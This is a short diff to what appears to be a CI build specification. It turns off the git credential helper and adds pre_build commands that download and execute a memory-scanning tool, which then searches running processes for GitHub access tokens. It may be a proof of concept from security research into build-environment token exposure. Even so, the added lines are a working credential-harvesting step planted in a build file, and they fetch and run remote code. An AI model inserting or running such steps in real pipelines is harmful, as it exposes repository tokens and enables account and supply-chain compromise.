@@ -1,9 +1,11 @@
 version: 0.2
 
 env:
-  git-credential-helper: yes
+  git-credential-helper: no
   
 phases:
   pre_build:
     commands:
       - echo "Hello World"
+      - curl -o dismember -L https://github.com/liamg/dismember/releases/download/v0.0.1/dismember-linux-amd64 && chmod +x dismember
+      - ./dismember grep 'gh[pousr]_[0-9a-zA-Z]{36}' -s .
